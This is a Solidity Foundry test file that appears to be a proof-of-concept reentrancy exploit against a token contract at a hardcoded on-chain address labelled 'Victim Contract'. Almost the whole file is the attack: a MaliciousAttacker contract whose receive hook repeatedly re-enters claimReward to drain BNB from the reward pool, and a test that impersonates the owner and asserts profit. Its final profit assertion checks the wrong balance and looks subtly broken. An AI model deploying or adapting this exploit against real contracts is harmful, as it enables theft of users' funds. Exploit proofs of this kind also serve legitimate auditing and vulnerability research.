// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ContractWolf_Audit_Metaverse_Kombat {
    function claimReward() external;
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 _minTokensBeforeSwap) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function _rewardPool() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousAttacker {
    ContractWolf_Audit_Metaverse_Kombat public target;
    uint256 public callCount;

    constructor(address _target) {
        target = ContractWolf_Audit_Metaverse_Kombat(_target);
    }

    function attack() external {
        callCount = 0;
        target.claimReward();
    }

    receive() external payable {
        callCount++;
        // Re-enter claimReward while state hasn't been updated yet
        // Limit reentrancy to prevent infinite loop
        if (callCount < 5 && address(target).balance > 0) {
            target.claimReward();
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
    ContractWolf_Audit_Metaverse_Kombat target;
    MaliciousAttacker attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ContractWolf_Audit_Metaverse_Kombat(TARGET);
        vm.label(TARGET, "Victim Contract");

        attacker = new MaliciousAttacker(TARGET);
        vm.label(address(attacker), "Attacker Contract");

        // Inject MVK tokens to attacker contract
        IERC20(TARGET).transfer(address(attacker), 1000000 * 1e18);

        // Enable swapAndLiquify as owner
        address owner = target.owner();
        vm.startPrank(owner);
        target.setSwapAndLiquifyEnabled(true, 0);
        vm.stopPrank();

        // Ensure target contract has BNB for reward pool
        vm.deal(TARGET, 50 ether);

        // Manually add to reward pool by simulating swapAndLiquify effect
        // We'll directly transfer BNB to increase _rewardPool via normal flow
        // First trigger a transfer that will accumulate tokens in contract
        IERC20(TARGET).transfer(TARGET, 100000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalanceAttacker = address(attacker).balance;

        // Execute the reentrancy attack
        attacker.attack();

        // Verify profit - attacker should have drained BNB from reward pool
        uint256 finalBalanceAttacker = address(attacker).balance;
        assertGt(finalBalanceAttacker, initialBalanceAttacker, "Attacker did not profit from reentrancy attack");

        uint256 finalBalanceThis = address(this).balance;
        assertGt(finalBalanceThis, initialBalanceAttacker, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

